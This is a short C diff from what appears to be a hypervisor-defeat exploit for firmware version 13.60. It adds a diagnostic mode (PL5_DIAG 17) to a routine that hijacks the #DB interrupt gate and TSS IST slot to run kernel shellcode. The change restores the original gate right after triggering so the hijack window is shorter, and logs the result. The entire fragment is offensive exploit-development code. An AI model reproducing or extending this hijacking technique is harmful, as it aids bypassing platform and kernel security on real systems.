@@ -522,6 +522,14 @@ static int install_resume_hook(uint64_t cave_addr, int redirect) {
 #else
   kh_trigger(&hook);
 #endif
+#if PL5_DIAG == 17
+  /* P4.4 first iteration: shrink the hijack window to the trigger itself by
+   * putting the original #DB gate and TSS IST slot back immediately. */
+  {
+    int __r = kh_restore(&hook);
+    notify("13.60: P4 diag17: kh_restore rc=%d (gate+IST restored right after the trigger)\n", __r);
+  }
+#endif
   notify("13.60: [F] triggered\n");
 
   g_oracle = oracle;
@@ -896,6 +904,8 @@ int hv_defeat_1360(void *shellcode_kernel, size_t shellcode_kernel_len) {
   kh_diag_skip_mask = KH_SKIP_BIG | KH_SKIP_SCRATCH | KH_SKIP_IST;/* only the #DB gate */
 # elif PL5_DIAG == 15
   kh_diag_skip_mask = KH_SKIP_DR7;                                /* full install, DR7=0 */
+# elif PL5_DIAG == 17
+  kh_diag_skip_mask = 0;                                          /* full install, then restore */
 # else
   kh_diag_skip_mask = 0;                                          /* diag 10: all writes */
 # endif
